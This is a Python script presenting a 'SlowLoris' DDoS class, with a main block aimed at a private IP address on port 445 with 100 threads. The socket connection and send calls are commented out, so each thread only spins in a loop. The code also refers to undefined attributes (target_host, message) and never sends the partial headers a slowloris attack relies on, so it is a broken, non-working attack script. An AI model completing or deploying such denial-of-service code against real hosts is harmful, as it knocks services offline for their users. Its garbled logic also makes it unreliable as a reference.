import socket
import threading
import time

class SlowLoris:
    def __init__(self, target_ip : str, request = None , target_port=80, attack_time=1000000.0, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.epoch_termination = time.time() + float(attack_time) #epoch time that you want to terminate attack
        self.num_threads = num_threads
        if request == None:
            self.request = b'GET / HTTP/1.1\r\nHost:%s' % self.target_ip
        else:
            self.request = request.rstrip('\r\n\r\n').encode()
        self.terminate = False

    def thread(self):
        try:
            #target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #target.connect((self.target_ip, self.target_host))
            #target.settimeout(None)
            while time.time() <= self.epoch_termination:
                #target.send(self.message)
                pass
            #target.close()
        except Exception as e:
            print('[!] thread error: %s' % e)
            

    def attack(self):
        for x in range(self.num_threads):
            thread = threading.Thread(target = self.thread)
            thread.start()
            print('[+] began thread %s' % str(x))
        try:
            while time.time() <= self.epoch_termination:
                print('[*] Ddos running...')
                time.sleep(5)
        except KeyboardInterrupt:
            print('[*] terminating Ddos attack...')
            self.epoch_termination = 0

if __name__ == '__main__':
    ddos = SlowLoris('10.4.207.247', 'hello, world!', attack_time=10000, num_threads=100, target_port=445)
    ddos.attack()
